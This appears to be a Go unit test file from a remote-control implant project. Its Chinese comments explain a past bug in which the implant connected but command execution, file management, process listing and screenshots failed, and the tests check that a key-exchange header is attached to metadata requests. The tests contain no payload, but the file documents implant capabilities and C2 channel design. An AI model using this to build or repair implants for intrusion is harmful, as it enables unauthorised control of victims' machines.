//go:build transport_http

package main

import (
	"net/http"
	"testing"

	"implant/core/encrypt"
)

// ===== 回归守卫：带元数据的请求必须同时带上 KX 公钥 =====
//
// 这是一个**真实上线事故**的守卫。服务端对每个 HTTP 请求独立解析密钥
// （HTTP 无连接状态），所以凡是带 MetaInfo 的请求都必须带 X-Kx 头。
//
// 当时的 bug：只有"上报元数据/FirstBlood"那条请求带了头，`Recv()` 拉命令
// 与 `SendResult()` 回结果都没带 → 服务端回落静态密钥、却要解用派生密钥
// 加密的 MetaInfo → 解不开 → 拿不到 uid → **客户端能上线，但命令控制、
// 文件管理、进程、截图全部失效**。
//
// 修法是把 applyKxHeader 放进 applyMetadata 内部（而不是各调用点），
// 所以这里断言的就是"applyMetadata 一定带头"这条不变量：
// 以后就算新增请求路径，只要走 applyMetadata 就自动带上。

func TestApplyMetadataCarriesKxHeader(t *testing.T) {
	c := &HTTPClient{}
	c.kxPub = "TEST_PUBLIC_KEY_BASE64"

	req, err := http.NewRequest("GET", "http://example.invalid/", nil)
	if err != nil {
		t.Fatal(err)
	}
	c.applyMetadata(req)

	if got := req.Header.Get(encrypt.KxHeaderName); got != "TEST_PUBLIC_KEY_BASE64" {
		t.Fatalf("带元数据的请求未携带 %s 头（实际 %q）："+
			"服务端会回落静态密钥，MetaInfo 解不开，全部功能失效",
			encrypt.KxHeaderName, got)
	}
}

// 没做过交换时不能带头（老服务端/交换失败时走静态链路，行为必须与改造前一致）
func TestApplyMetadataNoKxHeaderWhenNotExchanged(t *testing.T) {
	c := &HTTPClient{} // kxPub 为空

	req, err := http.NewRequest("GET", "http://example.invalid/", nil)
	if err != nil {
		t.Fatal(err)
	}
	c.applyMetadata(req)

	if got := req.Header.Get(encrypt.KxHeaderName); got != "" {
		t.Fatalf("未完成交换时不应携带 %s 头（实际 %q）", encrypt.KxHeaderName, got)
	}
}
